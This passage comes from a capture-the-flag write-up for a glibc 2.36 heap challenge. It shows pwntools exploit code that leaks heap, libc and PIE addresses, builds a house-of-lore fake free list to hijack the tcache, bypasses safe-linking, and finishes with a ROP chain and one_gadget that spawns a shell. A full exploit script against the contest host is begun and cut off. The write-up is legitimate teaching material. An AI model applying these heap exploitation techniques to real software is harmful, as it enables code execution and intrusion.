Of importance here is the `fwd` and `bck`, which is the Forward pointer and the Backwards pointer used by `malloc()` (reference [Mallocinternals](https://sourceware.org/glibc/wiki/MallocInternals) if those terms confuse you).



However after the call to free was achieved, the observant pwner might have noticed that some addresses appeared in the `free'd` `chunk`.
Upon calling `malloc()` a second time (which now will malloc from the `unsorted bin` entry, even more addresses are left behind: 

```python
size = 0x400 - 0x290 - 8                # Calculate the size needed to align top chunk
info("Mallocing %s bytes" % hex(size))
malloc(size, b'A'*size)                 # malloc() and fill with data to allow for strlen out of bounds write

info("Overwriting top chunk size with 0xc01")
edit(0, b'B'*size+p16(0xc01)+p8(0))     # Overwrite top chunk size

malloc(0x1000, b'GiveMeAFree')          # malloc() large data to trigger BRK()
                                        # And cause a free on previous

malloc(0x61, b'\x41')					# Initiate more leaks
```



Running `xinfo` on the `addresses` in `gdb` reveals the following:

```
pwndbg> vis
[...]
0x5ee62f9ee400	0x4242424242424242	0x0000000000000071	BBBBBBBBq.......
0x5ee62f9ee410	0x00007e9148598241	0x00007e91485982a0	A.YH.~....YH.~..
0x5ee62f9ee420	0x00005ee62f9ee400	0x00005ee62f9ee400	.../.^...../.^..
0x5ee62f9ee430	0x0000000000000000	0x0000000000000000	................
0x5ee62f9ee440	0x0000000000000000	0x0000000000000000	................
0x5ee62f9ee450	0x0000000000000000	0x0000000000000000	................
0x5ee62f9ee460	0x0000000000000000	0x0000000000000000	................
0x5ee62f9ee470	0x0000000000000000	0x0000000000000b71	........q.......	 <-- unsortedbin[all][0]
0x5ee62f9ee480	0x00007e9148597cc0	0x00007e9148597cc0	.|YH.~...|YH.~..
[...]
0x5ee62f9eefe0	0x0000000000000b70	0x0000000000000010	p...............
0x5ee62f9eeff0	0x0000000000000000	0x0000000000000011	................
pwndbg> xinfo 0x00007e91485982a0
Extended information for virtual address 0x7e91485982a0:

  Containing mapping:
    0x7e9148597000     0x7e9148599000 rw-p     2000 1cb000 /chal/garbage-is-easy/glibc/libc.so.6

  Offset information:
         Mapped Area 0x7e91485982a0 = 0x7e9148597000 + 0x12a0
         File (Base) 0x7e91485982a0 = 0x7e91483cb000 + 0x1cd2a0
      File (Segment) 0x7e91485982a0 = 0x7e9148593930 + 0x4970
         File (Disk) 0x7e91485982a0 = /chal/garbage-is-easy/glibc/libc.so.6 + 0x1cc2a0

 Containing ELF sections:
               .data 0x7e91485982a0 = 0x7e91485971c0 + 0x10e0
pwndbg> xinfo 0x00005ee62f9ee400
Extended information for virtual address 0x5ee62f9ee400:

  Containing mapping:
    0x5ee62f9ee000     0x5ee62fa31000 rw-p    43000 0      [heap]

  Offset information:
         Mapped Area 0x5ee62f9ee400 = 0x5ee62f9ee000 + 0x400

```

The player will notice that the first `address` is `libc.so.6`'s base address `+ 0x1cc2a0`.   The second address is a pointer to the `chunk` itself. Both of the addresses are left behind by the `unsorted bin chunk`.



And since the `free` `chunk` is up against a `chunk` that is controlled by the player, these address can be read using the `read/write out of bounds` primitive from earlier (`function definitions` are from the `top chunk extension script`), effectively giving the player a `libc` leak and a `heap` leak:

```python
# Get info leaks
info("Calling malloc to pad up until HEAP pointer")
malloc(0x61, b'C'*17)                                       # Pad up until heap pointer
                                                            # NOTE: The null-byte has to be overwritten
                                                            # to allow for "Puts" to read the address.

heap_leak = int(see(2)[17:][::-1].hex()+'00', 16) - 0x400   # Read chunk to get heap leak
info("Heap leak: %s" % hex(heap_leak))

info("Calling malloc to pad up until Libc pointer")
malloc(0x61, b'D'*8)                                        # Pad up until the libc pointer
libc.address = int(see(3)[8:][::-1].hex(), 16) - 0x1cccc0   # Read pointer
ld = libc.address + 0x1dd000                                # Calculate relative offset to LD
info("Libc leak: %s" % hex(libc.address))
info("Ld leak: %s" % hex(ld))
```

*NOTE: Even though the `libc` leak comes before the `heap` leak, because the `heap` leak contains a `null-byte`, it has to be leaked via `Add new garbage bag` (as you can pre-define the `write length` and thereby do not get cut off by `strlen()` reaching the `null-byte`)*

As such, the player now has the `base address` of the `heap`, `libc` and `ld`.



#### Summary

- `Heap` and `Libc` pointers are left on the `chunk` from the `unsorted chunk` upon a call to `malloc`, meaning by padding up until the `addresses`, those can be leaked



### Crafting exploits

Armed with `read and write out of bounds` primitives, `base addresses` of the `heap`, `ld` and `libc` and an `unsorted bin chunk` within reach,  the player is finally ready to craft an exploit.

I decided to go with the [`house of lore`](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_lore.c) approach, but I'm sure other techniques could be used to solve this challenge as well. A detailed writeup of the exploit can be found in the [how2heap](https://github.com/shellphish/how2heap/) repo from shellphish.



#### Opening pandora's box (juggling unsorted bin to become t-cache via a variant of the `house of lore`-technique)

Essentially, the goal is to craft a `fake free list` in controlled memory (the `heap`), resize the `unsorted bin chunk` to fit in to the `small bins` chunk, overwrite the `backwards pointer` in the `small bin chunk` to load the `fake free list` in to the `t-cache`.



First, three addresses will be noted: `fake_free`, `buf1` and `buf2`. These addresses should be in user controlled memory (in this case the `heap`):

```python
# Prepare victim chunk and resize the unsorted free chunk to fit in to a smallbin
info("Mallocing new chunk to prepare fake free list")
malloc(0x9f8, b'E'*0x9f8)                       # Victim chunk, offset is Heap_leak + 0x4f0

fake_free = heap_leak + 0x600                   # Size 0xd0 (26*8)
buf2 = heap_leak + (0x600 + 0xe0)               # Size 0x20 (4*8)
buf1 = heap_leak + (0x600 + 0xe0) + 0x20        # Size 0x20 (4*8)

info("Fake free location: %s" % hex(fake_free))

info("Buf2 location %s" % hex(buf2))
info("Buf1 location %s" % hex(buf1))

info("Mallocing 1200 bytes to sort unsorted bin...")
malloc(1200, b'F'*1200)                         # malloc() a large chunk to force libc to sort
                                                # the unsorted free chunk in to small bins
```

By now, the `bins` should look like the following (`unsorted bin` has become a `smallbins entry`):

```
pwndbg> bins
tcachebins
empty
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x100: 0x55df85260ee0 —▸ 0x77229d601db0 (main_arena+336) ◂— 0x55df85260ee0
largebins
empty
```





Second,  the `BK` *(alias for `BCK` which is an alias for `backwards pointer`)* of the `smallbins free chunk`  to `buf1` (This will be used in a moment):

```python
# Set the BK of the smallbins free chunk to Buf1
payload = b'F'*(0x9f8+0x8)      # Pad the chunk to abuse the 8-byte alignment
edit(4, payload)                
payload += b'F'*8               # Edit again to reach the next 8-byte segment
edit(4, payload)


payload = b'F'*0x9f8
payload += p64(0x101)                   # Chunk size field (has to be valid to avoid mitigations kicking in)
payload += p64(0xdeadbeef)              # Forward pointer can be anything
payload += p64(buf1)                    # Backwards pointer to the buffer controlled by player

edit(4, payload)                        # Apply payload
```



The `heap` and `vis` command should now look like the following:

```
pwndbg> heap
[...]
Free chunk (smallbins) | PREV_INUSE
Addr: 0x561ca197bee0
Size: 0x101
fd: 0xdeadbeef
bk: 0x561ca197b700

pwndbg> vis 
0x561ca197b000	0x0000000000000000	0x0000000000000291	................
[...]
0x561ca197bec0	0x4646464646464646	0x4646464646464646	FFFFFFFFFFFFFFFF
0x561ca197bed0	0x4646464646464646	0x4646464646464646	FFFFFFFFFFFFFFFF
0x561ca197bee0	0x4646464646464646	0x0000000000000101	FFFFFFFF........	 <-- smallbins[0x100][0]
0x561ca197bef0	0x00000000deadbeef	0x0000561ca197b700	.............V..
[...]
```

Where `fd` is any value and `bk` is a pointer to `buf1`.



Lastly, the `fake free list` will be created and `buf1` and `buf2` will be populated:

```python
# Create the fake free list
payload = b'\x11'*0x110             # Padding to reach pointers

# -------------- Setup fake free list --------------- #
for i in range(1, 7):
    payload += p64(0xFFFFFFFFFFFFFFFF)*3    # Padding
    payload += p64(fake_free + (8*4)*i)     # Calculate offset to next fake free entry (BK pointer)
payload += p64(0xFFFFFFFFFFFFFFFF)*3        # Padding
payload += p64(0)                           # Null-byte to "terminate" free linked list 
# -------------------------------------------------- #

# Buf 2
payload += p64(0)*2                     # Padding
payload += p64(buf1)                    # Forward pointer to buf 1
payload += p64(fake_free)               # Pointer to fake free list

# Buf 1
payload += p64(0)*2                     # Padding
payload += p64(heap_leak + 0xee0)       # Forward pointer to "victim chunk" to bypass the check of small bin corruption
payload += p64(buf2)                    # Backward pointer to buf 2

payload += b'\x44'*(0x9f8-len(payload)) # Padding

edit(4, payload)                        # Apply payload

# Cause fake free list to be loaded
malloc(248, b'$'*248) # <--- This is now mallocd on top of a free small bin, but we don't care 
```



Creating a structure that looks like the following (The `hex values` to the left of the `chunks` are pretend `addresses`):

````

                Fake free list
              ┌────────┬────────┐
0x1000────────┤0xffffff│0xffffff│◄───┐
              ├────────┼────────┤    │
              │0xffffff│ 0x1020 ├──┐ │
              ├────────┼────────┤  │ │
0x1020────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x1040 ├──┐ │
              ├────────┼────────┤  │ │
0x1040────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x1060 ├──┐ │
              ├────────┼────────┤  │ │
0x1060────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x1080 ├──┐ │
              ├────────┼────────┤  │ │
0x1080────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x10a0 ├──┐ │
              ├────────┼────────┤  │ │
0x10a0────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x10c0 ├──┐ │
              ├────────┼────────┤  │ │
0x10c0────────┤0xffffff│0xffffff│◄─┘ │
              ├────────┼────────┤    │
              │0xffffff│ 0x0000 │    │
              └────────┴────────┘    │
                                     │
              ┌────────┬────────┐    │
  ┌───────────┤0x000000│0x000000│◄─┐ │
  │           ├────────┼────────┤  │ │
  │        ┌──┤ 0x1100 │ 0x1000 ├──┼─┘
  │        │  ├──┬─────┴────┬───┤  │
  │        │  │  │          │   │  │
  │        │  │ ┌┴─┐       ┌┴─┐ │  │
0x10e0     │  │ │BK│       │FD│ │  │
           │  │ └──┘       └──┘ │  │
           │  │      Buf 2      │  │
           │  ├────────┬────────┤  │
           └─►│0x000000│0x000000│◄─┼─┐
  ┌───────────┼────────┼────────┤  │ │
  │      ┌────┤ 0x1300 │ 0x10e0 ├──┘ │
  │      │    ├──┬─────┴────┬───┤    │
  │      │    │  │          │   │    │
0x1100   │    │ ┌┴─┐       ┌┴─┐ │    │
         │    │ │BK│       │FD│ │    │
         │    │ └──┘       └──┘ │    │
         │    │      Buf 1      │    │
         │    └─────────────────┘    │
         │                           │
         │                           │
         │                           │
         │                           │
         │                           │
         │    ┌────────┬────────┐    │
         └───►│        │  0x101 │ ◄──┼── Size field
              ├────────┼────────┤    │
0x1300────────┤ 0xdead │ 0x1100 ├────┘
              ├──┬─────┴────┬───┤
              │  │          │   │
              │ ┌┴─┐       ┌┴─┐ │
              │ │BK│       │FD│ │
              │ └──┘       └──┘ │
              │    Free chunk   │
              └─────────────────┘
````



By calling `malloc()` after setting up the two `buffers` and `free list`, `malloc()` will follow the `BK` pointer of the `small bin` in an attempt to find an exact fit (which it won't), but in the process of doing so, it's going to index the `fake free` list in to the `t-cache`.

The `bins` and `vis` should look like the following:

```
pwndbg> bins
tcachebins
0x100 [  7]: 0x5568cf23d690 —▸ 0x5568cf23d670 —▸ 0x5568cf23d650 —▸ 0x5568cf23d630 —▸ 0x5568cf23d610 —▸ 0x5568cf23d6f0 —▸ 0x5568cf23d710 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x100 [corrupted]
FD: 0x5568cf23dee0 ◂— 0x2424242424242424 ('$$$$$$$$')
BK: 0x5568cf23d6a0 —▸ 0x5568cf23d6c0 ◂— 0x0
largebins
empty

pwndbg> vis

0x5568cf23d000	0x0000000000000000	0x0000000000000291	................
[...]
0x5568cf23d100	0x00005568cf23d690	0x0000000000000000	..#.hU..........
0x5568cf23d110	0x0000000000000000	0x0000000000000000	................
[...]
0x5568cf23d610	0x0000556d99af24cd	0x2627bee0bbf2743b	.$..mU..;t....'&	 <-- tcachebins[0x100][4/7]
0x5568cf23d620	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d630	0x0000556d99af242d	0x2627bee0bbf2743b	-$..mU..;t....'&	 <-- tcachebins[0x100][3/7]
0x5568cf23d640	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d650	0x0000556d99af240d	0x2627bee0bbf2743b	.$..mU..;t....'&	 <-- tcachebins[0x100][2/7]
0x5568cf23d660	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d670	0x0000556d99af246d	0x2627bee0bbf2743b	m$..mU..;t....'&	 <-- tcachebins[0x100][1/7]
0x5568cf23d680	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d690	0x0000556d99af244d	0x2627bee0bbf2743b	M$..mU..;t....'&	 <-- tcachebins[0x100][0/7]
0x5568cf23d6a0	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d6b0	0x00007f9761bbddb0	0x00005568cf23d6c0	...a......#.hU..
0x5568cf23d6c0	0xffffffffffffffff	0xffffffffffffffff	................
0x5568cf23d6d0	0xffffffffffffffff	0x0000000000000000	................
0x5568cf23d6e0	0x0000000000000000	0x0000000000000000	................
0x5568cf23d6f0	0x0000556d99af252d	0x2627bee0bbf2743b	-%..mU..;t....'&	 <-- tcachebins[0x100][5/7]
0x5568cf23d700	0x0000000000000000	0x0000000000000001	................
0x5568cf23d710	0x00000005568cf23d	0x2627bee0bbf2743b	=..V....;t....'&	 <-- tcachebins[0x100][6/7]
[...]
0x5568cf23dee0	0x4444444444444444	0x0000000000000101	DDDDDDDD........	 <-- smallbins[0x100][0]
[...]
0x5568cf23dfe0	0x2424242424242424	0x0000000000000011	$$$$$$$$........
0x5568cf23dff0	0x0000000000000000	0x0000000000000011	................
```



At this point the player controls the `t-cache singly linked list`, and now has an `arbitrary read` and `arbitrary write` gadget.



#### Making it last (From one-time t-cache hijack to consistent arbitrary r/w)

First things first, to reach the pointer of the `t-cache` list, a bit of padding is needed. As shown in the "`house of lore`"-writeup segment towards the end, the `pointers` in the t-cache bin contains a lot of `\x00`'s, meaning some padding will have to be made. A simple snippet such as the following does the trick:

```python
payload = b'A'*0x128            # Padding to reach FD of t-cache entry 0
edit(4, payload)

# -------- Loop to abuse 8-byte alignment to reach t-cache --------- #
for i in range(2, 13):
    if i%3 == 0:
        payload += b'A'*0x10
    else:
        payload += b'A'*0x8
    edit(4, payload)
# ------------------------------------------------------------------ #
```



##### safe-linking mitigation (PROTECT_PTR)

After which a new payload can be constructed which reaches all the way to the pointer of `t-cache` `entry 0`. However as the challenge uses `glibc 2.36`, the newly added [safe-linking](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) mitigation has to be bypassed. Luckily this is rather easy with the `leaks` from earlier.



The mitigation itself is fairly simple:

```c
#define PROTECT_PTR(pos, ptr, type)  \
        ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type)   \
        PROTECT_PTR(pos, ptr, type)
```



And can be bypassed by simply taking the `PAGE_SHIFT` from the `heap_leak` and `xoring` it with the `destination` wanted:

```python
# Defeat PROTECT_PTR and insert the address of garbage_truck in to the tcache
prot_xor = heap_leak>>12	# Get the pos >> PAGE_SHIFT "xor key"
dest = heap_leak+0x100		# Destination is the malloc management chunk
fin = prot_xor ^ dest		# Calculate the PROTECT_PTR result
info("PROTECT_PTR res: %s^%s = %s" % (hex(prot_xor), hex(dest), hex(fin)))

edit(4, payload+p64(fin))	# Send payload

# Malloc to make the next t-cache entry the dest address
malloc(0x100-0x8, b'_')
```



For illustrative purposes, the `dest` variable can be changed to a recognizable `debug value` to illustrate the outcome:

```python
dest = 0xcafebabe
```

Looking at the `tcachebins` output:

```
pwndbg> tcachebins 
tcachebins
0x100 [  7]: 0x55d631f5b690 ◂— 0xcafebabe
```


Of interest here, however, is the `t-cache` management `chunk`. When looking at `vis`, one might notice that there is an address in the very first `chunk`, which just so happens to be the active `t-cache` address:

```
pwndbg> vis

0x55d631f5b000	0x0000000000000000	0x0000000000000291	................
[...]
0x55d631f5b020	0x0000000000000000	0x0000000700000000	................
[...]
0x55d631f5b100	0x000055d631f5b690	0x0000000000000000	...1.U..........
```

If the player takes control of this segment in the `chunk`, they can effectively take control over the `t-cache`. The value `0x0000000700000000` *(which is actually a 32-bit value and should be read as `0x00000007`)* indicates the amount of entries in the `t-cache bin`. This effectively means that the player is able to control the amount of `t-cache entries` available.

The address located right after the `t-cache counter` *(`0x000055d631f5b690`)* is the upcoming `t-cache` address. Overwriting this `address` gives an `arbitrary read/write` pointer.

The `management chunk` is thereby a very valuable target, as it allows for a limited `arbitrary r/w` to become almost endless (provided `malloc()` is accessible).



##### Making it last (Hijacking `malloc index` (`&garbage_truck`))



###### Even more leaks plz (getting PIE leak)

The `t-cache` hijacking would in many cases be the end of the story, but in the case of this challenge, the player only has a limited amount of `malloc()` calls (`11`), which is slowly creeping up on us:

```
Mallocs: 9
1) Add new garbage bag
2) Admire garbage
3) Fill garbage bag
> 
```

A more future-proof method for `arbitrary r/w` is thereby needed, and thinking back to the `reverse engineering` section, `&garbage_truck` might just be the perfect candidate!

But the player only has a `Heap`, `Libc` and `LD` leak... Unless??

As the player already has an `arbitrary read` and `arbitrary write` primitive via the `t-cache`, it's simply a matter of finding a pointer (in any of the leaks the player has) which points to a `PIE` address. And finding some are straight forward.



Simply searching for the first `4 bytes` of the `base address` shows plenty of pointers to random `PIE addresses`: 

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x558518ffa000     0x558518ffb000 r--p     1000      0 /chal/garbage-is-easy/chal
    0x558518ffb000     0x558518ffc000 r-xp     1000   1000 /chal/garbage-is-easy/chal
    0x558518ffc000     0x558518ffe000 r--p     2000   2000 /chal/garbage-is-easy/chal
    0x558518ffe000     0x558518fff000 r--p     1000   3000 /chal/garbage-is-easy/chal
    0x558518fff000     0x558519000000 rw-p     1000   4000 /chal/garbage-is-easy/chal
    0x55851a215000     0x55851a258000 rw-p    43000      0 [heap]
    0x7f68c174d000     0x7f68c1750000 rw-p     3000      0 [anon_7f68c174d]
    0x7f68c1750000     0x7f68c1779000 r--p    29000      0 /chal/garbage-is-easy/glibc/libc.so.6
    0x7f68c1779000     0x7f68c18c3000 r-xp   14a000  29000 /chal/garbage-is-easy/glibc/libc.so.6
    0x7f68c18c3000     0x7f68c1918000 r--p    55000 173000 /chal/garbage-is-easy/glibc/libc.so.6
    0x7f68c1918000     0x7f68c191c000 r--p     4000 1c7000 /chal/garbage-is-easy/glibc/libc.so.6
    0x7f68c191c000     0x7f68c191e000 rw-p     2000 1cb000 /chal/garbage-is-easy/glibc/libc.so.6
    0x7f68c191e000     0x7f68c192d000 rw-p     f000      0 [anon_7f68c191e]
    0x7f68c192d000     0x7f68c192e000 r--p     1000      0 /chal/garbage-is-easy/glibc/ld.so
    0x7f68c192e000     0x7f68c1953000 r-xp    25000   1000 /chal/garbage-is-easy/glibc/ld.so
    0x7f68c1953000     0x7f68c195d000 r--p     a000  26000 /chal/garbage-is-easy/glibc/ld.so
    0x7f68c195e000     0x7f68c1960000 r--p     2000  30000 /chal/garbage-is-easy/glibc/ld.so
    0x7f68c1960000     0x7f68c1962000 rw-p     2000  32000 /chal/garbage-is-easy/glibc/ld.so
    0x7ffc91893000     0x7ffc918b4000 rw-p    21000      0 [stack]
    0x7ffc919d8000     0x7ffc919dc000 r--p     4000      0 [vvar]
    0x7ffc919dc000     0x7ffc919de000 r-xp     2000      0 [vdso]
pwndbg> search -4 0x558518ff
Searching for value: b'\xff\x18\x85U'
chal            0x558518ffed6a 0xb1700000558518ff
[...]
chal            0x558518fff00a 0x558518ff
libc.so.6       0x7f68c191be2a 0xc7e00000558518ff
[...]
libc.so.6       0x7f68c191bf4a 0x36800000558518ff
[anon_7f68c191e] 0x7f68c192b712 0x1a750000558518ff
[...]
[anon_7f68c191e] 0x7f68c192b742 0x69170000558518ff
[anon_7f68c191e] 0x7f68c192b752 0x558518ff
ld.so           0x7f68c195eaa2 0xf0c00000558518ff
[...]
[stack]         0x7ffc918b0292 0x8a400000558518ff
[...]
[stack]         0x7ffc918b2d62 0xb0000558518ff
```



The player can even find pointers that point to the `base binary` `mappings`:

```
pwndbg> search -t pointer 0x558518ffa000
Searching for value: b'\x00\xa0\xff\x18\x85U\x00\x00'
ld.so           0x7f68c195eaa0 0x558518ffa000
ld.so           0x7f68c1961300 0x558518ffa000
ld.so           0x7f68c1961670 0x558518ffa000
```

Choosing any of the `ld.so` addresses will do. I chose the one in the middle, namely:

```
pwndbg> xinfo 0x7f68c1961300
Extended information for virtual address 0x7f68c1961300:

  Containing mapping:
    0x7f68c1960000     0x7f68c1962000 rw-p     2000  32000 /chal/garbage-is-easy/glibc/ld.so

  Offset information:
         Mapped Area 0x7f68c1961300 = 0x7f68c1960000 + 0x1300
         File (Base) 0x7f68c1961300 = 0x7f68c192d000 + 0x34300
         File (Disk) 0x7f68c1961300 = [not file backed]
```



Getting a `PIE` leak can be achieved like the following:

```python
# Get a PIE leak
base_ptr = ld + 0x34300
malloc(0x100-0x8, p64(base_ptr))                # Put ld.so pointer to base in bin

malloc(0x100-0x8, b'\x08')                      # malloc() the ld.so pointer and read the pointer to get PIE, 
                                                # making sure to overwrite the lower null-byte so puts can read

elf.address = int(see(9)[::-1].hex(), 16) - 8   # Parse the leak (and subtract the null-byte overwriting)
info('Base address: %s' % hex(elf.address))
```



###### Unlimited power (Actually taking control over the `malloc indexer` (`&garbage_truck`))

The final (`11th`) call to `malloc()` will be the last one that's needed. By now, the player probably has a pretty good understanding of how to make `arbitrary r/w` via `t-cache`, and using the `PIE` leak, the player can now successfully hijack the `&garbage_truck`:

```python
# Taking control of &garbage_truck (the malloc indexer) 
edit(8, p64(elf.symbols['garbage_truck'])) # Set the next tcache addr directly to garbage_truck

payload =  p64(0xdeadbeefcafebabe)              # Entry 0 will be the 'buffer' for operations
payload += p64(elf.symbols['garbage_truck'])    # Entry 1 will be the buffer for entry 0
payload += p64(heap_leak + 0x100)               # Entry 2 will be the next tcache pointer
payload += p64(elf.symbols['garbage_truck']+88) # Entry 3 will control the malloc counter
malloc(0x100-0x8, payload)                      # malloc() on top of &garbage_truck and write payload
```



At this point, the player can control the `malloc indexer`, `malloc counter`, the `heap management chunk`, the `t-cache` pointers and has every leak needed except for a `stack` leak.



###### Last leak, I promise (getting `stack leak`)

Using same trick as when getting a `PIE` leak, pointers to the stack can be found with `gdb`:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x56337a87a000     0x56337a87b000 r--p     1000      0 /chal/garbage-is-easy/chal
[...]
    0x7ffdc2038000     0x7ffdc2059000 rw-p    21000      0 [stack]
[...]
pwndbg> search -4 0x7ffdc203
Searching for value: b'\x03\xc2\xfd\x7f'
pwndbg> search -4 0x7ffdc204
Searching for value: b'\x04\xc2\xfd\x7f'
pwndbg> search -4 0x7ffdc205
Searching for value: b'\x05\xc2\xfd\x7f'
[anon_7effcb454] 0x7effcb454a3a 0x75c000007ffdc205
[anon_7effcb454] 0x7effcb454a42 0x7ffdc205
[anon_7effcb454] 0x7effcb454dda 0x7ffdc205
libc.so.6       0x7effcb624512 0x855500007ffdc205
libc.so.6       0x7effcb62451a 0x7ffdc205
libc.so.6       0x7effcb624a02 0x100007ffdc205
[anon_7effcb625] 0x7effcb62b322 0x7ffdc205
ld.so           0x7effcb666ab2 0x7ffdc205
ld.so           0x7effcb666ada 0x100007ffdc205
ld.so           0x7effcb666b6a 0x100007ffdc205
ld.so           0x7effcb6682f2 0x7ffdc205
[stack]         0x7ffdc2054dd2 0x76a800007ffdc205
[...]
[stack]         0x7ffdc2057922 0x7ffdc205
```

Once again the player may choose whichever pointer they like (although it has to be `r/w` as `t-cache` will write some `meta-data` when `allocating` the `chunk`).



Getting a `stack leak` can be achieved like the following:

```python
# Getting a stack leak
edit(3, p64(0x5))								# Set malloc counter to 5 (only entries we need)

edit(1, p64(elf.symbols['garbage_truck']+32))	# Set entry 0 to point to entry 5 (which will be used as a pointer to __libc_argc)
edit(0, p64(libc.symbols['__libc_argv']))		# Actual pointer to __libc_argv

sp = int(see(4)[::-1].hex(), 16) - 296			# Parse the leak and subtract correct values to get desired address
info("Stack pointer: %s" % hex(sp))
```



### Profit (shell)

#### `ROP` our way to heaven (`ROPing` the process and running a `ONE_GADGET`)



To finish this long journey, the player can simply use the `RSP` *(`stack`)* `leak` to hijack the process flow utilizing classic `ROP`-techniques.
This ability can be combined with a `one_gadget`, making sure the `constraints` one the `one_gadget` are fulfilled:

```python
# Prepare next tcache entry to be the address of upcoming RIP
edit(2, p64(sp-32))

# Get shellz with simple ROP and a one_gadget
popr        = libc.address + 0x000000000002b9e3 # : pop r12 ; pop r13 ; ret

one_gadget  = libc.address + 0xd05ea            # 0xd05ea execve("/bin/sh", r12, r13)
                                                # constraints:
                                                #   [r12] == NULL || r12 == NULL
                                                #   [r13] == NULL || r13 == NULL
 
payload = b'A'*24    # Padding
payload += p64(popr) # gadget to pop contrains
payload += p64(0)*2  # Set r12 and r13 to 0
payload += p64(one_gadget)  # One gadget
```



Now all there is left to do, is trigger the `ROP`:

```python
# Trigger the one_gadget
p.sendline(b'1')                    # Call malloc() menu option
p.sendline(str(0x100-8).encode())   # Malloc t-cache pointer (RBP value)
p.sendline(payload)                 # Send payload and ROP the process
```



#### Full exploit script

```python
from pwn import *

elf = ELF("chal")
libc = elf.libc
#p = process(elf.path)
#gdb.attach(p)
p = remote("garbage.hack.fe-ctf.dk", 1337)

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data):
    p.sendline(b'1')
    p.sendlineafter(b'out:\n', str(size).encode())
    p.sendafter(b'out:\n', data)
    menu()

def see(index):
    p.sendline(b'2')
    p.sendlineafter(b"at:\n", str(index).encode())
    res = p.recvuntil(b"1)").split(b"\nMallocs")[0]
    menu()
    return res

def edit(index, data):
    p.sendline(b'3')
    p.sendlineafter(b"to:", str(index).encode())
    p.sendafter(b"out:", data)
    menu()




# Cause a free due to top chunk extension
size = 0x400 - 0x290 - 8                # Calculate the size needed to align top chunk
info("Mallocing %s bytes" % hex(size))
malloc(size, b'A'*size)                 # malloc() and fill with data to allow for strlen() out of bounds write

info("Overwriting top chunk size with 0xc01")
edit(0, b'B'*size+p16(0xc01)+p8(0))     # Overwrite top chunk size

malloc(0x1000, b'GiveMeAFree')          # malloc() large data to trigger BRK()
                                        # And cause a free on previous


# Get info leaks
info("Calling malloc to pad up until HEAP pointer")
malloc(0x61, b'C'*17)                                       # Pad up until heap pointer
                                                            # NOTE: The null-byte has to be overwritten
                                                            # to allow for "puts()" to read the address.

heap_leak = int(see(2)[17:][::-1].hex()+'00', 16) - 0x400   # Read chunk to get heap leak
info("Heap leak: %s" % hex(heap_leak))

info("Calling malloc to pad up until Libc pointer")
malloc(0x61, b'D'*8)                                        # Pad up until the libc pointer
libc.address = int(see(3)[8:][::-1].hex(), 16) - 0x1cccc0   # Read pointer
ld = libc.address + 0x1dd000                                # Calculate relative offset to LD
info("Libc leak: %s" % hex(libc.address))
info("Ld leak: %s" % hex(ld))


# Prepare victim chunk and resize the unsorted free chunk to fit in to a smallbin
info("Mallocing new chunk to prepare fake free list")
malloc(0x9f8, b'E'*0x9f8)                       # Victim chunk, offset is Heap_leak + 0x4f0

fake_free = heap_leak + 0x600                   # Size 0xd0 (26*8)
buf2 = heap_leak + (0x600 + 0xe0)               # Size 0x20 (4*8)
buf1 = heap_leak + (0x600 + 0xe0) + 0x20        # Size 0x20 (4*8)

info("Fake free location: %s" % hex(fake_free))

info("Buf2 location %s" % hex(buf2))
info("Buf1 location %s" % hex(buf1))

info("Mallocing 1200 bytes to sort unsorted bin...")
malloc(1200, b'F'*1200)                         # malloc() a large chunk to force libc to sort
                                                # the unsorted free chunk in to small bins


# Set the BK of the smallbins free chunk to Buf1
payload = b'F'*(0x9f8+0x8)      # Pad the chunk to abuse the 8-byte alignment
edit(4, payload)                
payload += b'F'*8               # Edit again to reach the next 8-byte segment
edit(4, payload)


payload = b'F'*0x9f8
payload += p64(0x101)                   # Chunk size field (has to be valid to avoid mitigations kicking in)
payload += p64(0xdeadbeef)              # Forward pointer can be anything
payload += p64(buf1)                    # Backwards pointer to the buffer controlled by player

edit(4, payload)                        # Apply payload



# Create the fake free list
payload = b'\x11'*0x110             # Padding to reach pointers

# -------------- Setup fake free list --------------- #
for i in range(1, 7):
    payload += p64(0xFFFFFFFFFFFFFFFF)*3    # Padding
    payload += p64(fake_free + (8*4)*i)     # Calculate offset to next fake free entry (BK pointer)
payload += p64(0xFFFFFFFFFFFFFFFF)*3        # Padding
payload += p64(0)                           # Null-byte to "terminate" free linked list 
# -------------------------------------------------- #

# Buf 2
payload += p64(0)*2                     # Padding
payload += p64(buf1)                    # Forward pointer to buf 1
payload += p64(fake_free)               # Pointer to fake free list

# Buf 1
payload += p64(0)*2                     # Padding
payload += p64(heap_leak + 0xee0)       # Forward pointer to "victim chunk" to bypass the check of small bin corruption
payload += p64(buf2)                    # Backward pointer to buf 2

payload += b'\x44'*(0x9f8-len(payload)) # Padding to be able to write to full chunk (strlen() and null-byte cutoff prevention)

edit(4, payload)                        # Apply payload

# Cause fake free list to be loaded
malloc(248, b'$'*248) # <--- This is now mallocd on top of a free small bin, but we don't care 



